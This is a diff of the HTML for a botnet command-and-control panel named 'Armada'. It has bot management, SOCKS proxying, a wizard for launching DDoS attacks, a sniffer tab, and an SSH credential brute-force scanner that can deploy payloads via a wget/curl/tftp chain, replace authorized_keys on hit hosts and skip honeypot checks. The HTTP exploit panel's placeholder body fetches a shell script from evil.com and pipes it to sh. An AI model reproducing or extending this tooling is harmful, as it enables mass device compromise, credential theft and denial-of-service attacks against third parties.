@@ -6,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Armada</title>
     <link rel="stylesheet" href="/static/style.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@xterm/xterm@5.5.0/css/xterm.min.css">
 </head>
 
 <body>
@@ -31,8 +32,10 @@
                     <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z" />
                 </svg>
             </button>
-            <select id="global-theme-picker" onchange="applyGlobalTheme(this.value)" title="Panel theme" style="background:var(--bg-card,#161b22);color:var(--text-primary,#c9d1d9);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px;cursor:pointer"></select>
-            <button class="help-btn" onclick="refreshCurrentTab()" title="Refresh current tab (R)" style="font-size:14px">&#8635;</button>
+            <select id="global-theme-picker" onchange="applyGlobalTheme(this.value)" title="Panel theme"
+                style="background:var(--bg-card,#161b22);color:var(--text-primary,#c9d1d9);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px;cursor:pointer"></select>
+            <button class="help-btn" onclick="refreshCurrentTab()" title="Refresh current tab (R)"
+                style="font-size:14px">&#8635;</button>
             <button class="help-btn" onclick="toggleHelp()" title="Keyboard shortcuts (?)">?</button>
             <button class="notif-toggle" onclick="toggleNotifs()" id="notif-btn">Notifications <span class="notif-badge"
                     id="notif-badge" style="display:none">0</span></button>
@@ -115,7 +118,8 @@
                     <button class="cmd-btn cmd-btn-sec" onclick="saveCmdTemplate()" title="Save">Save</button>
                     <button class="cmd-btn cmd-btn-sec" onclick="deleteCmdTemplate()" title="Delete">Del</button>
                     <div class="cmd-history-wrap">
-                        <button class="cmd-btn cmd-btn-sec cmd-history-btn" onclick="toggleCmdHistory()" title="Command history">&#x1f551;</button>
+                        <button class="cmd-btn cmd-btn-sec cmd-history-btn" onclick="toggleCmdHistory()"
+                            title="Command history">&#x1f551;</button>
                         <div class="cmd-history-dropdown" id="cmd-history-dropdown"></div>
                     </div>
                 </div>
@@ -127,22 +131,19 @@
                     <option value="!socks" data-cat="network">!socks</option>
                     <option value="!stopsocks" data-cat="network">!stopsocks</option>
                     <option value="!socksauth" data-cat="network">!socksauth</option>
-                    <option value="!scan" data-cat="scanner">!scan</option>
-                    <option value="!stopscan" data-cat="scanner">!stopscan</option>
-                    <option value="!info" data-cat="mgmt">!info</option>
-                    <option value="!persist" data-cat="mgmt">!persist</option>
-                    <option value="!reinstall" data-cat="mgmt">!reinstall</option>
                     <option value="!updatefetch" data-cat="mgmt">!updatefetch</option>
                     <option value="!lolnogtfo" data-cat="mgmt">!kill</option>
                 </select>
                 <div id="arg-fields" class="cmd-args"></div>
                 <div class="cmd-target-wrap">
-                    <input type="text" id="cmd-bot" placeholder="target: all bots" class="cmd-target" autocomplete="off">
+                    <input type="text" id="cmd-bot" placeholder="target: all bots" class="cmd-target"
+                        autocomplete="off">
                     <button class="cmd-target-clear" id="cmd-target-clear" onclick="clearCmdTarget()"
                         title="Clear target" style="display:none">&times;</button>
                 </div>
                 <button class="cmd-btn cmd-send" onclick="sendCmd()">Send</button>
-                <button class="cmd-btn cmd-btn-sec" onclick="previewCmd()" title="Send to 5 random bots first">Preview</button>
+                <button class="cmd-btn cmd-btn-sec" onclick="previewCmd()"
+                    title="Send to 5 random bots first">Preview</button>
             </div>
         </div>
 
@@ -152,15 +153,20 @@
                     id="tab-bots-count">0</span></button>
             <button class="tab" data-tab="tab-socks" onclick="switchTab(this)">SOCKS <span class="tab-count"
                     id="tab-socks-count">0</span></button>
-            <button class="tab" data-tab="tab-attack" onclick="switchTab(this);loadAttackHistory()">Attack <span class="tab-count" id="tab-attack-count">0</span></button>
+            <button class="tab" data-tab="tab-attack" onclick="switchTab(this);loadAttackHistory()">Attack <span
+                    class="tab-count" id="tab-attack-count">0</span></button>
             <button class="tab" data-tab="tab-activity" onclick="switchTab(this)">Activity</button>
-            <button class="tab" data-tab="tab-relays" onclick="switchTab(this);loadRelays();loadRelayAPIStatus();loadWebhooks()">Relays
+            <button class="tab" data-tab="tab-relays"
+                onclick="switchTab(this);loadRelays();loadRelayAPIStatus();loadWebhooks()">Relays
                 <span class="tab-count" id="tab-relays-count">0</span></button>
             <button class="tab" data-tab="tab-tasks" onclick="switchTab(this);loadTasks()">Tasks <span class="tab-count"
                     id="tab-tasks-count">0</span></button>
             <button class="tab" data-tab="tab-users" onclick="switchTab(this);loadUsers()">Users</button>
             <button class="tab" data-tab="tab-scanners" onclick="switchTab(this);sshRefreshStatus()">Scanners</button>
-            <button class="tab" data-tab="tab-results" onclick="switchTab(this);scanJobRefresh();scanJobRefreshHits()">Results <span class="tab-count" id="tab-results-count" style="display:none">0</span></button>
+            <button class="tab" data-tab="tab-sniffer" onclick="switchTab(this);snifferRefresh()">Sniffer</button>
+            <button class="tab" data-tab="tab-results"
+                onclick="switchTab(this);scanJobRefresh();scanJobRefreshHits()">Results <span class="tab-count"
+                    id="tab-results-count" style="display:none">0</span></button>
         </div>
 
         <!-- Tab: Bots -->
@@ -171,7 +177,8 @@
                     autocomplete="off" spellcheck="false">
                 <span class="search-count" id="search-count"></span>
                 <button class="compact-toggle" onclick="refreshAll()" title="Refresh bots &amp; stats">&#8635;</button>
-                <button class="compact-toggle" onclick="exportBotsCSV()" title="Export filtered bots as CSV">Export</button>
+                <button class="compact-toggle" onclick="exportBotsCSV()"
+                    title="Export filtered bots as CSV">Export</button>
                 <button class="compact-toggle" id="compact-toggle" onclick="toggleCompactMode()"
                     title="Toggle compact mode">Compact</button>
             </div>
@@ -190,11 +197,8 @@
                 <div class="ms-actions">
                     <button class="ms-btn ms-btn-group" onclick="msSetGroup()">Set Group</button>
                     <button class="ms-btn" onclick="msOpenShells()">Open Shells</button>
-                    <button class="ms-btn" onclick="msCmd('!socks')">Start SOCKS</button>
-                    <button class="ms-btn" onclick="msCmd('!persist')">Persist</button>
-                    <button class="ms-btn" onclick="msScan()">Start Scan</button>
-                    <button class="ms-btn" onclick="msCmd('!stopscan')">Stop Scan</button>
-                    <button class="ms-btn" onclick="msCmd('!info')">Info</button>
+                    <button class="ms-btn" onclick="msStartSocks()">Start SOCKS</button>
+                    <button class="ms-btn" onclick="msUpdateFetch()">Update Fetch</button>
                     <button class="ms-btn ms-btn-danger" onclick="msKill()">Kill</button>
                 </div>
             </div>
@@ -281,12 +285,16 @@
                         </div>
                         <div class="wiz-form-row">
                             <label>Duration (seconds)</label>
-                            <input type="range" id="wiz-duration-slider" min="30" max="3600" value="120" oninput="document.getElementById('wiz-duration-val').value=this.value">
-                            <input type="number" id="wiz-duration-val" value="120" min="30" max="3600" oninput="document.getElementById('wiz-duration-slider').value=this.value">
+                            <input type="range" id="wiz-duration-slider" min="30" max="3600" value="120"
+                                oninput="document.getElementById('wiz-duration-val').value=this.value">
+                            <input type="number" id="wiz-duration-val" value="120" min="30" max="3600"
+                                oninput="document.getElementById('wiz-duration-slider').value=this.value">
                         </div>
                         <div class="wiz-form-row">
                             <label>Filter: Architecture</label>
-                            <select id="wiz-arch-filter"><option value="">All</option></select>
+                            <select id="wiz-arch-filter">
+                                <option value="">All</option>
+                            </select>
                         </div>
                         <div class="wiz-form-row">
                             <label>Filter: Min RAM (MB)</label>
@@ -305,10 +313,12 @@
                     </div>
                 </div>
                 <div class="wizard-footer">
-                    <button class="btn btn-secondary" id="wiz-back" onclick="wizardBack()" style="display:none">Back</button>
+                    <button class="btn btn-secondary" id="wiz-back" onclick="wizardBack()"
+                        style="display:none">Back</button>
                     <span id="wiz-estimate" class="wiz-estimate"></span>
                     <button class="btn btn-primary" id="wiz-next" onclick="wizardNext()">Next</button>
-                    <button class="btn btn-danger" id="wiz-launch" onclick="wizardLaunch()" style="display:none">Launch Attack</button>
+                    <button class="btn btn-danger" id="wiz-launch" onclick="wizardLaunch()" style="display:none">Launch
+                        Attack</button>
                 </div>
             </div>
             <div class="atk-panel">
@@ -372,10 +382,12 @@
             </div>
 
             <!-- Throughput Gauge -->
-            <div id="throughput-gauge" style="display:none;margin-bottom:16px;padding:12px 16px;background:var(--bg-card,#161b22);border:1px solid var(--border,#30363d);border-radius:8px">
+            <div id="throughput-gauge"
+                style="display:none;margin-bottom:16px;padding:12px 16px;background:var(--bg-card,#161b22);border:1px solid var(--border,#30363d);border-radius:8px">
                 <div style="display:flex;justify-content:space-between;align-items:center">
                     <span style="font-size:12px;opacity:0.6">Estimated Throughput</span>
-                    <span id="throughput-text" style="font-size:15px;font-weight:600;color:#3fb950;font-family:monospace"></span>
+                    <span id="throughput-text"
+                        style="font-size:15px;font-weight:600;color:#3fb950;font-family:monospace"></span>
                 </div>
             </div>
 
@@ -394,7 +406,8 @@
             <div class="atk-section">
                 <div class="atk-section-header">
                     <h3>Attack History</h3>
-                    <button class="compact-toggle" onclick="clearAttackHistory()" title="Clear all history">Clear History</button>
+                    <button class="compact-toggle" onclick="clearAttackHistory()" title="Clear all history">Clear
+                        History</button>
                 </div>
                 <table class="tbl" id="atk-history-tbl">
                     <thead>
@@ -508,7 +521,8 @@
             <!-- Webhooks Section -->
             <div style="margin-top:24px;border-top:1px solid var(--border);padding-top:16px">
                 <div class="users-toolbar" style="margin-bottom:12px">
-                    <span style="color:var(--text-dim);font-size:13px">Webhook notifications for Discord, Telegram, or any HTTP endpoint. Events are sent as Discord-compatible JSON.</span>
+                    <span style="color:var(--text-dim);font-size:13px">Webhook notifications for Discord, Telegram, or
+                        any HTTP endpoint. Events are sent as Discord-compatible JSON.</span>
                 </div>
                 <div class="users-form-wrap" style="display:block;margin-bottom:16px">
                     <div class="users-form">
@@ -519,18 +533,33 @@
                         </div>
                         <div class="uf-row">
                             <label>URL</label>
-                            <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" style="width:100%">
+                            <input type="text" id="wh-url" placeholder="https://discord.com/api/webhooks/..."
+                                autocomplete="off" style="width:100%">
                         </div>
                         <div class="uf-row">
                             <label>Events</label>
                             <div id="wh-events" style="display:flex;flex-wrap:wrap;gap:8px;padding:4px 0">
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="connect" checked> Connect</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="disconnect" checked> Disconnect</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="attack" checked> Attack</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="scan"> Scan</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="auth_fail" checked> Auth Fail</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="socks"> SOCKS</label>
-                                <label style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input type="checkbox" value="command"> Command</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="connect" checked> Connect</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="disconnect" checked> Disconnect</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="attack" checked> Attack</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="scan"> Scan</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="auth_fail" checked> Auth Fail</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="socks"> SOCKS</label>
+                                <label
+                                    style="display:flex;align-items:center;gap:4px;font-size:12px;cursor:pointer"><input
+                                        type="checkbox" value="command"> Command</label>
                             </div>
                         </div>
                         <div class="uf-row">
@@ -539,7 +568,8 @@
                         </div>
                         <div class="uf-actions">
                             <button class="uf-save" onclick="addWebhook()">Add Webhook</button>
-                            <button class="uf-save" onclick="testWebhooks()" style="background:var(--blue,#58a6ff)">Test All</button>
+                            <button class="uf-save" onclick="testWebhooks()" style="background:var(--blue,#58a6ff)">Test
+                                All</button>
                         </div>
                     </div>
                 </div>
@@ -567,10 +597,6 @@
                                 <option value="!socks">!socks</option>
                                 <option value="!stopsocks">!stopsocks</option>
                                 <option value="!socksauth">!socksauth</option>
-                                <option value="!info">!info</option>
-                                <option value="!persist">!persist</option>
-                                <option value="!scan">!scan</option>
-                                <option value="!stopscan">!stopscan</option>
                                 <option value="!updatefetch">!updatefetch</option>
                                 <option value="!lolnogtfo">!kill</option>
                             </select>
@@ -668,15 +694,18 @@
 
         <!-- Tab: Scanners -->
         <div class="tab-panel" id="tab-scanners">
-            <div class="users-toolbar" style="margin-bottom:12px;display:flex;gap:12px;align-items:center;flex-wrap:wrap">
+            <div class="users-toolbar"
+                style="margin-bottom:12px;display:flex;gap:12px;align-items:center;flex-wrap:wrap">
                 <span style="color:var(--text-dim);font-size:13px">Start or stop scanners across bots.</span>
                 <div style="display:flex;gap:8px;align-items:center;margin-left:auto">
                     <label style="font-size:12px;color:var(--text-dim)">Arch</label>
-                    <select id="scan-arch" onchange="updateScanFilterCount()" style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px">
+                    <select id="scan-arch" onchange="updateScanFilterCount()"
+                        style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px">
                         <option value="">All</option>
                     </select>
                     <label style="font-size:12px;color:var(--text-dim)">Min RAM</label>
-                    <select id="scan-ram" onchange="updateScanFilterCount()" style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px">
+                    <select id="scan-ram" onchange="updateScanFilterCount()"
+                        style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:4px 8px;font-size:12px">
                         <option value="0">All</option>
                         <option value="512">&ge; 512MB</option>
                         <option value="1024">&ge; 1GB</option>
@@ -688,44 +717,41 @@
             </div>
             <div class="scanner-stats-grid" id="scanner-stats-grid"></div>
             <div class="scanner-grid" style="grid-template-columns:1fr 1fr">
-                <!-- Telnet Scanner -->
-                <div class="scanner-card">
-                    <div class="scanner-card-header">
-                        <span class="scanner-card-title">Telnet Scanner</span>
-                        <span class="scanner-card-desc">Brute-force Telnet credentials and spread to new devices</span>
-                    </div>
-                    <div class="scanner-card-body">
-                        <div class="cmd-group" style="margin-bottom:10px">
-                            <label>Scan Server</label>
-                            <input type="text" id="scan-telnet-addr" placeholder="host:port (e.g. 1.2.3.4:48290)"
-                                class="cmd-target" style="width:100%">
-                        </div>
-                        <div class="scanner-card-actions">
-                            <button class="ms-btn" onclick="scannerStart('telnet')">Start All</button>
-                            <button class="ms-btn ms-btn-danger" onclick="scannerStop('telnet')">Stop All</button>
-                        </div>
-                    </div>
-                </div>
-
                 <!-- SSH Scanner -->
                 <div class="scanner-card" style="grid-column: 1 / -1">
                     <div class="scanner-card-header">
                         <span class="scanner-card-title">SSH Scanner</span>
-                        <span class="scanner-card-desc">SSH-2.0 credential scanner — DH key exchange + AES-128-CTR. Push targets + combos from here.</span>
+                        <span class="scanner-card-desc">SSH-2.0 credential scanner — DH key exchange + AES-128-CTR. Push
+                            targets + combos from here.</span>
                     </div>
                     <div class="scanner-card-body">
                         <div style="display:flex;gap:12px;margin-bottom:12px">
                             <div style="flex:1">
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Targets (1 IP per line, port 22) <button class="ms-btn" onclick="document.getElementById('ssh-targets-file').click()" style="font-size:10px;padding:2px 8px;margin-left:6px">Upload</button><input type="file" id="ssh-targets-file" accept=".txt,.csv,.list" style="display:none" onchange="sshLoadFile(this,'ssh-targets')"></div>
-                                <textarea id="ssh-targets" rows="6" style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical" placeholder="192.168.1.1&#10;10.0.0.5&#10;172.16.0.100"></textarea>
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Targets (1 IP per line, port
+                                    22) <button class="ms-btn"
+                                        onclick="document.getElementById('ssh-targets-file').click()"
+                                        style="font-size:10px;padding:2px 8px;margin-left:6px">Upload</button><input
+                                        type="file" id="ssh-targets-file" accept=".txt,.csv,.list" style="display:none"
+                                        onchange="sshLoadFile(this,'ssh-targets')"></div>
+                                <textarea id="ssh-targets" rows="6"
+                                    style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical"
+                                    placeholder="192.168.1.1&#10;10.0.0.5&#10;172.16.0.100"></textarea>
                             </div>
                             <div style="flex:1">
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Combos (user:pass per line, pass can be empty) <button class="ms-btn" onclick="document.getElementById('ssh-combos-file').click()" style="font-size:10px;padding:2px 8px;margin-left:6px">Upload</button><input type="file" id="ssh-combos-file" accept=".txt,.csv,.list" style="display:none" onchange="sshLoadFile(this,'ssh-combos')"></div>
-                                <textarea id="ssh-combos" rows="6" style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical" placeholder="root:admin&#10;root:123456&#10;admin:&#10;ubuntu:ubuntu"></textarea>
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Combos (user:pass per line,
+                                    pass can be empty) <button class="ms-btn"
+                                        onclick="document.getElementById('ssh-combos-file').click()"
+                                        style="font-size:10px;padding:2px 8px;margin-left:6px">Upload</button><input
+                                        type="file" id="ssh-combos-file" accept=".txt,.csv,.list" style="display:none"
+                                        onchange="sshLoadFile(this,'ssh-combos')"></div>
+                                <textarea id="ssh-combos" rows="6"
+                                    style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical"
+                                    placeholder="root:admin&#10;root:123456&#10;admin:&#10;ubuntu:ubuntu"></textarea>
                             </div>
                         </div>
                         <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">
-                            <select id="ssh-mode" onchange="sshModeChanged(this.value)" style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:6px 12px;font-size:13px">
+                            <select id="ssh-mode" onchange="sshModeChanged(this.value)"
+                                style="background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:6px 12px;font-size:13px">
                                 <option value="report">Report Only</option>
                                 <option value="deploy">Deploy (wget/curl/tftp chain)</option>
                                 <option value="command">Command</option>
@@ -734,29 +760,50 @@
                             <button class="ms-btn ms-btn-danger" onclick="sshStop()">Stop</button>
                             <span id="ssh-status-text" style="margin-left:8px;font-size:13px;opacity:0.7"></span>
                         </div>
+                        <div style="margin-bottom:10px">
+                            <label style="font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer"><input
+                                    type="checkbox" id="ssh-nohp"> Skip honeypot check (scan all hosts including
+                                cowrie/kippo)</label>
+                        </div>
                         <div id="ssh-deploy-wrap" style="display:none;margin-bottom:12px">
-                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Deploy URL (.sh script or ELF binary — bot tries wget → curl → tftp across writable dirs)</div>
-                            <input id="ssh-deploy-url" type="text" style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px" placeholder="http://your-server/payload.sh">
-                            <label style="font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer;margin-top:6px"><input type="checkbox" id="ssh-deploy-clean"> Clean (delete payload from disk after execution)</label>
+                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Deploy URL (.sh script or ELF
+                                binary — bot tries wget → curl → tftp across writable dirs)</div>
+                            <input id="ssh-deploy-url" type="text"
+                                style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px"
+                                placeholder="http://your-server/payload.sh">
+                            <label
+                                style="font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer;margin-top:6px"><input
+                                    type="checkbox" id="ssh-deploy-clean"> Clean (delete payload from disk after
+                                execution)</label>
                         </div>
                         <div id="ssh-command-wrap" style="display:none;margin-bottom:12px">
-                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Command (raw shell command to execute on hit)</div>
-                            <textarea id="ssh-command" rows="3" style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical" placeholder="uname -a"></textarea>
+                            <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Command (raw shell command to
+                                execute on hit)</div>
+                            <textarea id="ssh-command" rows="3"
+                                style="width:100%;font-family:monospace;font-size:12px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical"
+                                placeholder="uname -a"></textarea>
                         </div>
                         <div id="ssh-root-wrap" style="display:none;margin-bottom:12px">
                             <div style="display:flex;align-items:center;gap:8px">
-                                <label style="font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="ssh-root-mode" onchange="sshToggleRootMode(this.checked)"> Root Mode (inject SSH key on every hit)</label>
+                                <label
+                                    style="font-size:12px;display:flex;align-items:center;gap:6px;cursor:pointer"><input
+                                        type="checkbox" id="ssh-root-mode" onchange="sshToggleRootMode(this.checked)">
+                                    Root Mode (inject SSH key on every hit)</label>
                             </div>
                             <div id="ssh-root-key-wrap" style="display:none;margin-top:8px">
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">SSH Public Key (will replace authorized_keys on target)</div>
-                                <textarea id="ssh-root-key" rows="3" style="width:100%;font-family:monospace;font-size:11px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical;word-break:break-all" placeholder="ssh-rsa AAAAB3NzaC1yc2E... user@host"></textarea>
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">SSH Public Key (will replace
+                                    authorized_keys on target)</div>
+                                <textarea id="ssh-root-key" rows="3"
+                                    style="width:100%;font-family:monospace;font-size:11px;background:var(--bg-input,#0d1117);color:var(--text-primary,#e6edf3);border:1px solid var(--border,#30363d);border-radius:6px;padding:8px;resize:vertical;word-break:break-all"
+                                    placeholder="ssh-rsa AAAAB3NzaC1yc2E... user@host"></textarea>
                             </div>
                         </div>
                         <div id="ssh-hits-wrap"></div>
                         <div style="margin-top:8px;display:flex;gap:8px">
                             <button class="ms-btn" onclick="sshExportHits()" style="font-size:12px">Export CSV</button>
                             <button class="ms-btn" onclick="sshExportTxt()" style="font-size:12px">Export TXT</button>
-                            <button class="ms-btn" onclick="sshClearHits()" style="font-size:12px;opacity:0.6">Clear Hits</button>
+                            <button class="ms-btn" onclick="sshClearHits()" style="font-size:12px;opacity:0.6">Clear
+                                Hits</button>
                         </div>
                     </div>
                 </div>
@@ -765,56 +812,183 @@
                 <div class="scanner-card">
                     <div class="scanner-card-header">
                         <span class="scanner-card-title">HTTP Exploit</span>
-                        <span class="scanner-card-desc">Fire custom HTTP requests at targets — RCE payloads, PoC exploits</span>
+                        <span class="scanner-card-desc">Fire custom HTTP requests at targets — RCE payloads, PoC
+                            exploits</span>
                     </div>
                     <div class="scanner-card-body">
                         <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
                             <div>
                                 <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Method &amp; Path</div>
                                 <div style="display:flex;gap:6px;margin-bottom:8px">
-                                    <select id="hexpl-method" style="background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;font-family:var(--mono)">
-                                        <option>GET</option><option selected>POST</option><option>PUT</option>
+                                    <select id="hexpl-method"
+                                        style="background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;font-family:var(--mono)">
+                                        <option>GET</option>
+                                        <option selected>POST</option>
+                                        <option>PUT</option>
                                     </select>
-                                    <input type="text" id="hexpl-path" value="/cgi-bin/exploit" placeholder="/path" style="flex:1;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;font-family:var(--mono)">
+                                    <input type="text" id="hexpl-path" value="/cgi-bin/exploit" placeholder="/path"
+                                        style="flex:1;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;font-family:var(--mono)">
                                 </div>
                                 <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Port</div>
-                                <input type="number" id="hexpl-port" value="80" style="width:80px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
+                                <input type="number" id="hexpl-port" value="80"
+                                    style="width:80px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
                                 <div style="font-size:12px;opacity:0.6;margin-bottom:4px">User-Agent</div>
-                                <input type="text" id="hexpl-ua" value="Mozilla/5.0 (compatible; Googlebot/2.1)" placeholder="User-Agent" style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Expect (match in response)</div>
-                                <input type="text" id="hexpl-expect" value="200" placeholder="200 or text match" style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Custom Headers (key: value, one per line)</div>
-                                <textarea id="hexpl-headers" rows="3" placeholder="Content-Type: application/x-www-form-urlencoded&#10;X-Custom: value" style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
+                                <input type="text" id="hexpl-ua" value="Mozilla/5.0 (compatible; Googlebot/2.1)"
+                                    placeholder="User-Agent"
+                                    style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Expect (match in response)
+                                </div>
+                                <input type="text" id="hexpl-expect" value="200" placeholder="200 or text match"
+                                    style="width:100%;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:6px;font-size:12px;margin-bottom:8px">
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Custom Headers (key: value,
+                                    one per line)</div>
+                                <textarea id="hexpl-headers" rows="3"
+                                    placeholder="Content-Type: application/x-www-form-urlencoded&#10;X-Custom: value"
+                                    style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
                             </div>
                             <div>
                                 <div style="font-size:12px;opacity:0.6;margin-bottom:4px">Targets (1 IP per line)</div>
-                                <textarea id="hexpl-targets" rows="6" placeholder="192.168.1.1&#10;10.0.0.5" style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
-                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px;margin-top:8px">Request Body (POST/PUT payload)</div>
-                                <textarea id="hexpl-body" rows="5" placeholder="cmd=id;wget http://evil.com/shell.sh|sh" style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
+                                <textarea id="hexpl-targets" rows="6" placeholder="192.168.1.1&#10;10.0.0.5"
+                                    style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
+                                <div style="font-size:12px;opacity:0.6;margin-bottom:4px;margin-top:8px">Request Body
+                                    (POST/PUT payload)</div>
+                                <textarea id="hexpl-body" rows="5" placeholder="cmd=id;wget http://evil.com/shell.sh|sh"
+                                    style="width:100%;font-family:var(--mono);font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;resize:vertical"></textarea>
                             </div>
                         </div>
                         <div style="margin-top:8px;font-size:12px;color:var(--text-dim)" id="hexpl-status-text"></div>
                         <!-- Live payload preview -->
                         <div style="margin-top:10px">
-                            <div style="font-size:11px;color:var(--text-dim);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display==='none'?'block':'none'">&#9654; Payload Preview</div>
